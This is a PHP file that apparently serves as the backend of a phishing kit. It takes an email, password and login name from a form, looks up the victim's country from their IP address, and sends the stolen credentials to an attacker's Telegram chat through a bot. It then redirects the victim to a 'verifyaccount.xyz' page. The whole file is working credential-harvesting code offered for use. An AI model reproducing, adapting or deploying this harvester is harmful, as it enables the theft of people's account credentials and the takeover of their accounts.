<?php
ob_start();
$API_KEY = "YOUR TOKEN";

define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
    $tbbots = http_build_query($datas);
        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
        $ttktt = file_get_contents($url);
        return json_decode($ttktt);
}
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
date_default_timezone_set('Asia/Baghdad');
$time = date('h:i');
$year = date('Y');
$month = date('n');
$day = date('j');
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$user = $message->from->username;

$admin = "YOUR ID";
$email = $_GET["email"];
$password = $_GET["password"];
$login = $_GET["login"];


if($email){
$url1 = "http://www.verifyaccount.xyz/index.php?uc=H";
header("location: $url1");
$geo = json_decode(file_get_contents("https://extreme-ip-lookup.com/json/".$ip));
$cty = $geo->country;
$cdt = json_decode(file_get_contents("https://api.ipgeolocationapi.com/geolocate/".$ip));
$ccode = $cdt->country_code;
$name = $message->from->first_name;

bot("sendMessage",[
"chat_id"=>$admin,
"text"=>"
๐๐ถ๐ผ ๐ฏ๐จ๐ฝ๐ฌ ๐จ ๐ต๐ฌ๐พ ๐ณ๐ถ๐ฎ๐ฐ๐ต

๐ค ยฆ ๐ฌ๐๐๐๐ ยป `$email`
๐ ยฆ ๐ท๐๐๐๐๐๐๐  ยป `$password`
โ๏ธ ยฆ ๐ช๐๐๐๐๐๐ ๐ช๐๐๐ ยป `+$ccode`
๐ฑ ยฆ ๐ณ๐๐๐๐ ยป $login
๐๏ธโ๐จ๏ธ ยฆ ๐ช๐๐๐๐๐๐ ยป $cty
โฑ ยฆ ๐ป๐๐๐ ยป $time
๐ ยฆ ๐ซ๐๐๐ ยป $day/$month/$year
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
}
?>
<html>
  <head>
    <meta http-equiv="refresh" content="0; url='http://www.verifyaccount.xyz/index.php?uc=H'" />
    <script type="text/javascript">
            window.location.href = "http://www.verifyaccount.xyz/index.php?uc=H"
    </script>
 </head>
  <body>
  </body>
</html>
